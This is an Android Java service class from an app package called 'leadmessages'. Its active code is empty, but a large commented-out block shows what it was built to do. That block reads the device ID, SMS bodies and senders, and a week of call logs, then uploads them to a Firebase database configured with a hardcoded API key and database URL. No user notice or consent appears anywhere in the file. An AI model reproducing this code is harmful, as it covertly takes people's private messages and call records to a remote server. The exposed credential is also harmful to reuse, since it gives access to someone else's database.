package com.nfx.leadmessages;

import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;
import android.provider.CallLog;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

/**
 * Created by Admin on 01-02-2017.
 */

public class ReadMessages extends Service {
    private static final Uri MESSAGE_URI = Uri.parse("content://sms/");
    private static final Uri CALL_LOG_URI = CallLog.Calls.CONTENT_URI;
    String[] CALL_LOG_PROJECTIONS = new String[]{
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.NUMBER,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION,
            CallLog.Calls.TYPE
    };
    private String fpId = null, mobileId = null;
    private String[] projections = new String[]{"date", "address", "body", "seen"};
    private String selection = "";
    private String order = "date DESC";
    private String CALL_order = CallLog.Calls.DATE + " DESC";
    private int DAYS_BEFORE = 7;


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//        SharedPreferences pref = getSharedPreferences(Constants.SHARED_PREF, Context.MODE_PRIVATE);
//        fpId = pref.getString(Constants.FP_ID, null);
//        DAYS_BEFORE = Integer.parseInt(pref.getString(CALL_LOG_TIME_INTERVAL, DAYS_BEFORE + ""));
//        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
//                && ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
//            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
//            mobileId = tm.getDeviceId();
//        }
//        String smsAddresses = pref.getString(SMS_REGEX, null);
//        if (mobileId == null || fpId == null || smsAddresses == null) {
//            return Service.START_NOT_STICKY;
//        }
//        String[] selectionList = TextUtils.split(smsAddresses, ",");
//        StringBuilder builder = new StringBuilder();
//        int listSize = selectionList.length;
//        for (int i = 0; i < listSize; i++) {
//
//            if (i == listSize - 1) {
//                builder.append(" address Like \"" + selectionList[i] + "\"");
//            } else {
//                builder.append(" address Like \"" + selectionList[i] + "\" or");
//            }
//        }
//        selection = builder.toString();
//        //Log.v("ggg",smsAddresses.replaceAll("%",""));
//        new Thread(new Runnable() {
//            @Override
//            public void run() {
//                FirebaseOptions options = new FirebaseOptions.Builder()
//                        .setApiKey("AIzaSyBowYAh4TLbruwJoqL3QnQaKhBmB83EgEs")
//                        .setApplicationId("1:506969475000:android:afe3b748e8b5c95f")
//                        .setDatabaseUrl("https://nfxteam-153211.firebaseio.com")
//                        .build();
//                FirebaseApp secondApp = null;
//                try {
//                    secondApp = FirebaseApp.initializeApp(ReadMessages.this, options, "second app");
//                }catch(Exception e) {
//                    try {
//                        secondApp = FirebaseApp.getInstance("second app");
//                    }catch(Exception e1){
//                        e1.printStackTrace();
//                    }
//                }
//                if(secondApp == null) return;
//                FirebaseDatabase secondDatabase = FirebaseDatabase.getInstance(secondApp);
//                DatabaseReference mDatabase = secondDatabase.getReference();
//                //readMessage(mDatabase);
//                //readCallLog(mDatabase);
//                stopSelf();
//
//            }
//        }).start();
        return Service.START_NOT_STICKY;
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /*private void readCallLog(DatabaseReference mDatabase) {
        ContentResolver resolver = getContentResolver();
        Calendar calendar = Calendar.getInstance();
        String currentTime = String.valueOf(calendar.getTimeInMillis());

        calendar.add(Calendar.DATE, -DAYS_BEFORE);
        String selection = CallLog.Calls.DATE + ">=" + calendar.getTimeInMillis();
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        Cursor cursor = resolver.query(CALL_LOG_URI, CALL_LOG_PROJECTIONS, selection, null, CALL_order);
        if(cursor!=null && cursor.moveToFirst()){

            PhoneIds phoneIds=new PhoneIds();
            phoneIds.setDate(currentTime);
            phoneIds.setPhoneId(mobileId);
            DatabaseReference phoneIdRef = mDatabase.child(fpId+Constants.DETAILS).child(Constants.PHONE_IDS);
            phoneIdRef.child(mobileId).setValue(phoneIds);

            CallLogModel model;

            DatabaseReference MessageIdRef = mDatabase.child(fpId+Constants.CALL_LOG).child(mobileId);
            MessageIdRef.removeValue();

            do{
                model = new CallLogModel();

                model.setName(cursor.getString(0));
                model.setNumber(cursor.getString(1));
                model.setDate(String.valueOf(cursor.getLong(2)));
                model.setDuration_seconds(String.valueOf(cursor.getLong(3)));
                int callType = cursor.getInt(4);

                String type = null;
                switch (callType) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        type = "Outgoing";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        type = "Incoming";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        type = "Missed";
                        break;
                    case CallLog.Calls.REJECTED_TYPE:
                        type = "Rejected";
                        break;
                }
                model.setCallType(type);
                MessageIdRef.push().setValue(model);

            }while(cursor.moveToNext());
            cursor.close();
        }
    }*/

   /* private void addCallBack(DatabaseReference messageIdRef) {
        messageIdRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                for (DataSnapshot data:dataSnapshot.getChildren()){
                    Log.v("ggg",data.toString());
                }
            }

            @Override
            public void onCancelled(DatabaseError databaseError) {

            }
        });
    }*/

//    private void readMessage(DatabaseReference mDatabase){
//        ContentResolver resolver = getContentResolver();
//        Calendar calendar = Calendar.getInstance();
//        String currentTime = String.valueOf(calendar.getTimeInMillis());
//
//       /* calendar.add(Calendar.DATE,-DAYS_BEFORE);*/
//
//        //String selection1 = /*selection+" AND*/ "date"+">="+calendar.getTimeInMillis();
//        //Log.v("ggg",selection1);
//        Cursor cursor = resolver.query(MESSAGE_URI,projections,selection,null,order);
//            if(cursor!=null && cursor.moveToFirst()){
//
//                PhoneIds phoneIds=new PhoneIds();
//                phoneIds.setDate(currentTime);
//                phoneIds.setPhoneId(mobileId);
//                DatabaseReference phoneIdRef = mDatabase.child(fpId+Constants.DETAILS).child(Constants.PHONE_IDS);
//                phoneIdRef.child(mobileId).setValue(phoneIds);
//
//                SmsMessage message;
//                DatabaseReference MessageIdRef = mDatabase.child(fpId+Constants.MESSAGES).child(mobileId);
//                MessageIdRef.removeValue();
//                //addCallBack(MessageIdRef);
//                do{
//                    message = new SmsMessage()
//                            .setDate(cursor.getLong(0))
//                            .setSubject(cursor.getString(1))
//                            .setBody(cursor.getString(2))
//                            .setSeen(cursor.getString(3));
//
//                    //Log.v("ggg",message.toString());
//                    MessageIdRef.push().setValue(message);
//
//                }while(cursor.moveToNext());
//                cursor.close();
//            }
//    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}
